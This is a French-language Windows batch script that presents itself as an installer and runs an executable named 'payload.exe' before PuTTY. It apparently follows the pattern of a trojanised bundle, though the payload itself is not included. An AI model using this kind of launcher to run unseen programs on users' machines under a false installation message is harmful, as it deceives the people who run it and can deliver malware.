@echo off
echo Lancement de l'installation...
echo Veuillez patienter pendant l'extraction et l'exécution des programmes.
rem Lancement de payload.exe
start "" /wait "payload.exe"
rem Lancement de putty.exe
start "" /wait "putty.exe"
echo.
echo Programmes lancés. Appuyez sur une touche pour fermer.
pause >nul